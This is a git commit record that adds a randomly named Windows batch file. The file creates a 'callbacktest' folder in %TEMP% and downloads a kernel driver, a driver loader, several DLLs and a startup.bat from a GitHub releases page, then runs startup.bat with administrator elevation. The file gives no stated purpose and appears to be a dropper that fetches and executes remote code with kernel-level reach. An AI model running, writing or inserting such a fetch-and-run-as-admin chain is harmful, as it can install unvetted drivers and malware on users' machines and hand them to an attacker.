f477f2ea69fb8728ed62405d702d6b89cf85d068
topking91154 <hunt91195@gmail.com>
2025-04-09 17:13:39 -0700

    Add files via upload

---
+++ g53fR1T (1).bat
@@ -0,0 +1,15 @@
+@echo off
+set "FOLDER=%TEMP%\callbacktest"
+
+:: Create the folder
+powershell -Command "New-Item -ItemType Directory -Path '%FOLDER%' -Force | Out-Null"
+
+:: Download files
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/dark-cloud6666/API_callbacktest/releases/download/sfdsgs/driver.sys' -OutFile '%FOLDER%\driver.sys'"
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/dark-cloud6666/API_callbacktest/releases/download/sfdsgs/DrvLdr.exe' -OutFile '%FOLDER%\DrvLdr.exe'"
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/dark-cloud6666/API_callbacktest/releases/download/sfdsgs/drv64.dll' -OutFile '%FOLDER%\drv64.dll'"
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/dark-cloud6666/API_callbacktest/releases/download/sfdsgs/startup.bat' -OutFile '%FOLDER%\startup.bat'"
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/dark-cloud6666/API_callbacktest/releases/download/sfdsgs/Taigei64.dll' -OutFile '%FOLDER%\Taigei64.dll'"
+
+:: Run startup.bat as admin
+powershell -Command "Start-Process '%FOLDER%\startup.bat' -WorkingDirectory '%FOLDER%' -Verb RunAs"
